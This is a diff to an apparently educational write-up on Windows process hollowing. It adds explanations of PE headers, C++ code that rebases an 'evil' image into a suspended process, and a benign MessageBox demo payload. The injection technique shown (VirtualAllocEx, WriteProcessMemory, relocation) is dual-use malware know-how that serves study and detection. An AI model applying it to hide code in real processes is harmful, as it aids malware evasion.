@@ -219,7 +219,8 @@ As usual, to allocate memory in the target process we use VirtualAllocEx().
 
     PVOID mem = VirtualAllocEx(proc_info.hProcess, BaseAddress, nt_head->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); 
 ```
-After that we retrieve the DOS and NT headers from the mapped malicious file, as we said before, we allocate space to contain our malicious code in the memory. we grap the size of the code to allocate from our malicious code PE header using ``` nt_head->OptionalHeader.SizeOfImage ```.
+First, the dos_head pointer is assigned to the DOS header of the executable file, which is the first part of the PE file and contains legacy DOS-related information. This is done by casting the base address of the loaded file in memory (EvilImage) to a PIMAGE_DOS_HEADER type. Next, the code calculates the address of the NT headers by adding the offset stored in the e_lfanew field of the DOS header to the base address of the file. This offset indicates where the NT headers begin. The NT headers contain essential information about the PE file, such as the PE signature, file header, and optional header, which includes various data directories.
+After that we retrieved the DOS and NT headers from the mapped malicious file, as we said before, we allocate space to contain our malicious code in the memory. we grap the size of the code to allocate from our malicious code PE header using ``` nt_head->OptionalHeader.SizeOfImage ```.
 
 ```cpp
     if (!WriteProcessMemory(proc_info.hProcess, BaseAddress, EvilImage, nt_head->OptionalHeader.SizeOfHeaders, 0)) {
@@ -238,7 +239,8 @@ After that we retrieve the DOS and NT headers from the mapped malicious file, as
     }
 ```
 
-So we start by writing the PE optional headers that contains informations like the base adress, number of sections ... , then we iterate over the sections, for each one we got the start adress of the section and write it in the allocated memory. 
+So after successfully allocating memory, we start by writing the PE optional headers that contains informations like the base adress, number of sections ... . Then we iterate over the sections, for each one we get the start adress of the section, and write the section in the allocated memory using the adress.
+
 Super easy.
 
 ### Adjust Base Adresses ( relocating : The hard part for me )
@@ -251,6 +253,24 @@ The .reloc section in a PE file contains relocation information used by the wind
 For more understanding on why we need this relocation, When an executable is compiled, it is typically assigned a preferred base address where it expects to be loaded into memory. However, if another executable is already using that address space, the operating system will load the new executable at a different address. This is where the .reloc section comes to play.
 
 ```cpp
+	#ifdef _X86_
+		// Calculate The Offset Of The Susspended Process Base Address From The Files Base Address
+		DWORD BaseOffset = (DWORD)BaseAddress - nt_head->OptionalHeader.ImageBase;
+		printf("Original Process Base: 0x%llx\nEvil File Base: 0x%llx\nOffset: 0x%llx\n\n", nt_head->OptionalHeader.ImageBase, BaseAddress, BaseOffset);
+
+
+		// Change The Files Base Address To The Base Address Of The Susspended Process
+		nt_head->OptionalHeader.ImageBase = (DWORD)BaseAddress;
+	#endif
+	#ifdef _WIN64
+		// Calculate The Offset Of The Susspended Process Base Address From The Files Base Address
+		DWORD64 BaseOffset = (DWORD64)BaseAddress - nt_head->OptionalHeader.ImageBase;
+		printf("Original Process Base: 0x%llx\nEvil File Base: 0x%llx\nOffset: 0x%llx\n\n", nt_head->OptionalHeader.ImageBase, BaseAddress, BaseOffset);
+
+
+		// Change The Files Base Address To The Base Address Of The Susspended Process
+		nt_head->OptionalHeader.ImageBase = (DWORD64)BaseAddress;
+	#endif
         if (BaseOffset) {
         printf("\nRelocating The Relocation Table...\n");
         for (int i = 0; i < nt_head->FileHeader.NumberOfSections; i++) {
@@ -430,6 +450,20 @@ And finally we can resume the main thread by using ResumeThread(proc_info.hThrea
 ## Creating malicious executable
 
 In this part, We will create a HelloWorld executable that show a message box.
+```cpp
+#include <windows.h>
+
+int main() {
+    MessageBox(
+        NULL,                 // hWnd: A handle to the owner window. NULL indicates no owner window.
+        "Hello World", // lpText: The message to be displayed.
+        "Hello World",  // lpCaption: The title of the message box.
+        MB_OK | MB_ICONINFORMATION // uType: The contents and behavior of the message box. MB_OK creates an OK button, MB_ICONINFORMATION adds an information icon.
+    );
+    return 0;
+}
+```
+
 
 
 
